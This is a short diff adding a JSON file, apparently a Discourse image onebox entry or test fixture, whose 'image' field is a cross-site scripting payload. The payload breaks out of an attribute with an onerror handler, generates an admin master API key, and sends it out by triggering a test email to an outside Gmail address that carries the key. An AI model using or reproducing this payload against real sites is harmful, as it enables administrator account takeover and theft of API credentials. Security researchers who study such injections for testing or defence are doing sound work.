@@ -1,0 +1,7 @@
+{
+	"type": "image",
+	"image": "xss' onerror='Discourse.ApiKey.generateMasterKey().then(function(key){Discourse.ajax('/admin/email/test',{type:'POST',data:{email_address:'leomcardle+'+key.key+'_pwned@gmail.com'}})})",
+	"description": "",
+	"image_width": 1,
+	"image_height": 1
+}
